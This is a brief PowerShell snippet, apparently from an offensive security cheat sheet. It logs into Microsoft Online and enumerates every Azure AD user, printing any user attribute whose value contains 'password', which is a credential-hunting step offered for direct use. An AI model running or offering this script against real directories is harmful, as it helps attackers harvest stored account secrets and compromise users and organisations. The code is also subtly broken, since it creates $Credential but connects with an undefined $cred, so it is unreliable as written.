#Search every Azure AD user field for passwords:
$User = "<username>" 
$PWord = ConvertTo-SecureString -String "<password>" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $PWord

  
  Import-Module MSOnline
	Connect-MsolService -Credential $cred
	
	$users = Get-MsolUser; 
	foreach($user in $users){
	    $props =@();$user | Get-Member | foreach-object{$props+=$_.Name
	    }
	foreach($prop in $props){
	    if($user.$prop -like "*password*"){
	        Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
	        }
	    }
}
